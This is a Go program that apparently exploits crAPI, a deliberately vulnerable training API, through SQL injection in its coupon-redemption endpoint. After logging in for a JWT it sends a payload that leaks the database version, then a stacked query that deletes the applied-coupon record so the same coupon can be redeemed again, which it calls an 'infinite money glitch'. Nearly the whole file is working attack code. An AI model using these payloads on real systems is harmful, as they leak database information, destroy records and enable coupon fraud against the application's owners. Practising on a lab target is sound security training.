package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"

	configurator "github.com/tomek-skrond/crapiconfigurator"
)

func main() {
	pwd, _ := os.Getwd()
	config, err := configurator.GetConfig(pwd + "/config.json")
	if err != nil {
		log.Fatalln(err)
	}
	// to check video after you can use also:
	// curl -X GET -H "Authorization: Bearer $valid_token" http://crapi.bobaklabs.com:8888/identity/api/v2/user/videos/$videoId > file.out
	// get jwt token
	token := configurator.GetJWTToken(config.LoginURL, config.Email, config.Password)
	if token == "" {
		log.Fatalln("token empty")
	}

	leakPayload := "0'; select version() --+"
	sqliPayload := "TRAC075'; DELETE FROM applied_coupon WHERE coupon_code='TRAC075';--"
	submitCouponPayload := "TRAC075"

	fmt.Println("Database leaks through SQL Injection vulnerability:")
	SubmitCoupon(config.TargetURL, token, leakPayload)
	fmt.Println("Removing used coupon from DB")
	SubmitCoupon(config.TargetURL, token, sqliPayload)
	fmt.Println("Submitting it again")
	SubmitCoupon(config.TargetURL, token, submitCouponPayload)
	fmt.Println("Infinite money glitch!!")
}

func SubmitCoupon(tageturl, token, payloadString string) {
	client := configurator.CustomHttpClient()

	payload := map[string]interface{}{
		"coupon_code": payloadString,
		"amount":      75,
	}

	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		log.Fatalln(err)
	}

	req, err := http.NewRequest("POST", tageturl, bytes.NewBuffer(jsonPayload))
	if err != nil {
		log.Fatalln(err)
	}
	req.Header.Set("Content-Type", "application/json")

	req = configurator.ConfigureRequest(req, token)

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	respBody, err := configurator.ReadBody(resp)
	if err != nil {
		log.Fatalln(err)
	}

	fmt.Println(string(respBody))

}
